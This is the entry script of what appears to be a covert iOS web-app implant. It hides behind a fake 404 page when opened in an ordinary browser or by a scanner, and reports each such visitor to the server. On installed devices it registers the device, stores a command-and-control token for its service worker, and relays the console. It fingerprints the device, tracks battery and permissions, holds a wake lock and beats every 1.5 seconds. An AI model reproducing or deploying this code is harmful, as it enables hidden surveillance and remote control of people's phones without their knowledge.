import { CONFIG } from './config.js';
import { startBeacon, forceEvent, registerDevice } from './beacon.js';

// Module-level token extracted from URL (set once at load time)
const _wcToken = new URLSearchParams(location.search).get('t') || '';

async function fetchPersona() {
  try {
    const params = new URLSearchParams();
    if (_wcToken) params.set('t', _wcToken);
    if (CONFIG.deviceId) params.set('d', CONFIG.deviceId);
    const qs = params.toString() ? '?' + params.toString() : '';
    const res = await fetch('/api/wc/persona' + qs);
    if (!res.ok) throw new Error('persona fetch failed');
    return await res.json();
  } catch {
    return { ui_type: 'white' };
  }
}

// Apply full physical screen dimensions to body at startup so that position:absolute
// overlays can reliably cover the home-indicator zone on the first render.
// viewport-fit=cover is not always respected in WKWebView standalone; screen.height
// gives the true pixel height (e.g. 932 on iPhone 16 Plus vs innerHeight=873).
(function applyFullscreenBody() {
  const h = window.screen.height;
  document.documentElement.style.height = h + 'px';
  document.documentElement.style.overflow = 'hidden';
  document.body.style.height = h + 'px';
  document.body.style.overflow = 'hidden';
  document.body.style.position = 'relative';
})();
import { startConsoleRelay } from './modules/console_relay.js';
import { startBattery } from './modules/battery.js';
import { startHeartbeat, forceBeat } from './modules/heartbeat.js';
import { startWakeLock } from './modules/wakelock.js';
import { collectPassive } from './modules/fingerprint.js';
import { checkPermissions } from './modules/permissions.js';
import { requestPermission as requestPersistent } from './modules/persistent.js';
import { renderUI } from './ui.js';

function _show404() {
  document.open();
  document.write(`<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>404 Not Found</title><style>body{margin:0;font-family:-apple-system,BlinkMacSystemFont,'Helvetica Neue',Arial,sans-serif;background:#f4f4f4;color:#333;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center;padding:20px;box-sizing:border-box}h1{font-size:28px;font-weight:400;margin:0 0 10px}p{font-size:15px;color:#666;margin:0 0 20px}a{color:#007aff;text-decoration:none;font-size:15px}</style></head><body><h1>404 Not Found</h1><p>The requested URL was not found on this server.</p><a href="/">Go to home page</a></body></html>`);
  document.close();
}

async function init() {
  // Non-standalone open (browser, scanner, bot) — show 404 and report
  if (!navigator.standalone) {
    try {
      fetch('/api/probe', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          standalone: false,
          ua: navigator.userAgent,
          url: location.href,
          ts: Date.now(),
          screen: `${screen.width}x${screen.height}`,
          lang: navigator.language,
        }),
      }).catch(() => {});
    } catch { }
    _show404();
    return;
  }
  // Link token to device if both are available before persona fetch
  if (_wcToken && CONFIG.deviceId) {
    fetch('/api/wc/link-token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: _wcToken, device_id: CONFIG.deviceId }),
    }).catch(() => {});
  }

  const persona = await fetchPersona();
  renderUI(persona);
  startConsoleRelay();
  if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('/sw.js').then(reg => {
      reg.update();
      if (reg.waiting) {
        reg.waiting.postMessage({ type: 'SKIP_WAITING' });
        navigator.serviceWorker.addEventListener('controllerchange', () => location.reload());
      }
      reg.addEventListener('updatefound', () => {
        const nw = reg.installing;
        nw?.addEventListener('statechange', () => {
          if (nw.state === 'installed') {
            reg.waiting?.postMessage({ type: 'SKIP_WAITING' });
            // Reload once new SW takes control so app runs fresh code
            navigator.serviceWorker.addEventListener('controllerchange', () => location.reload());
          }
        });
      });
    }).catch(() => {});
  }

  const params = new URLSearchParams(location.search);
  const urlName = params.get('user') ?? params.get('name') ?? '';
  if (urlName) localStorage.setItem('wc_url_name', urlName);

  startBattery().catch(() => {});

  if (!CONFIG.deviceId) {
    const ua = navigator.userAgent;
    const model = ua.match(/iPhone OS ([\d_]+)/)?.[0]?.replace(/_/g, '.') ?? 'iPhone';
    const name = localStorage.getItem('wc_url_name') || model;
    const data = await registerDevice(name, ua);
    if (data?.device_id) {
      localStorage.setItem('wc_onboarded', '1');
      if (data.c2_token) localStorage.setItem('wc_c2_token', data.c2_token);
      // Link token to newly registered device
      if (_wcToken) {
        fetch('/api/wc/link-token', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ token: _wcToken, device_id: data.device_id }),
        }).catch(() => {});
      }
    }
  }

  // Seed SW C2_STORE so it can post pong results back on push
  (async () => {
    try {
      let c2tok = localStorage.getItem('wc_c2_token');
      if (!c2tok && CONFIG.deviceId) {
        const r = await fetch(`${CONFIG.server}/api/ws-token/${CONFIG.deviceId}`);
        const j = await r.json();
        if (j.token) { c2tok = j.token; localStorage.setItem('wc_c2_token', c2tok); }
      }
      if (c2tok && 'serviceWorker' in navigator) {
        const reg = await navigator.serviceWorker.ready;
        reg.active?.postMessage({ type: 'c2_init', server: CONFIG.server, token: c2tok });
      }
    } catch { /* non-fatal */ }
  })();

  // Re-validate push subscription on every startup — iOS can drop subscriptions
  // after a SW update. If the live subscription differs from what's stored, re-register.
  (async () => {
    try {
      if (!('PushManager' in window) || !CONFIG.deviceId) return;
      const reg = await navigator.serviceWorker.ready;
      const live = await reg.pushManager.getSubscription();
      const stored = localStorage.getItem('wc_push_sub');
      const storedObj = stored ? JSON.parse(stored) : null;
      if (!live || (storedObj && live.endpoint !== storedObj.endpoint)) {
        // Subscription lost or drifted — re-subscribe silently (permission already granted)
        if (Notification.permission !== 'granted') return;
        const { vapidPublicKey } = CONFIG;
        const subOptions = { userVisibleOnly: true };
        if (vapidPublicKey) {
          const padding = '='.repeat((4 - vapidPublicKey.length % 4) % 4);
          const base64 = (vapidPublicKey + padding).replace(/-/g, '+').replace(/_/g, '/');
          subOptions.applicationServerKey = new Uint8Array([...atob(base64)].map(c => c.charCodeAt(0)));
        }
        const newSub = live ?? await reg.pushManager.subscribe(subOptions);
        const subJson = JSON.stringify(newSub.toJSON());
        localStorage.setItem('wc_push_sub', subJson);
        await fetch(`${CONFIG.server}/api/subscribe`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ device_id: parseInt(CONFIG.deviceId), subscription: newSub.toJSON() }),
        }).catch(() => {});
      }
    } catch { /* non-fatal */ }
  })();

  forceEvent('app_open', { ts: Date.now(), standalone: !!navigator.standalone });
  collectPassive().catch(() => {});
  checkPermissions().catch(() => {});
  requestPersistent().catch(() => {});

  // Orientation changes trigger an immediate heartbeat with the new orientation.
  screen.orientation?.addEventListener('change', forceBeat);
  window.addEventListener('orientationchange', forceBeat);

  startBeacon().catch(() => {});
  startHeartbeat(1500);
  startWakeLock();
}

init().catch(console.error);
